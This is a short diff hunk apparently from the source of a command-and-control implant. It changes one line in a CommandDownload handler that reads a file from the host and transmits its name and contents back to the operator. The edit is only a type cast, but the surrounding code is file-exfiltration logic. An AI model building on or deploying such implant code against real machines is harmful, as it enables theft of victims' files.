@@ -539,7 +539,7 @@ VOID CommandDownload( PPARSER Parser ) {
 
     check_debug(ReadFile( hFile, Content, FileSize, &Read, NULL ) != 0, "ReadFile Failed!" );
 
-    PackageAddBytes( Package, FileName, NameSize );
+    PackageAddBytes( Package, (UCHAR*) FileName, NameSize );
     PackageAddBytes( Package, Content,  FileSize );
 
     PackageTransmit( Package, NULL, NULL );
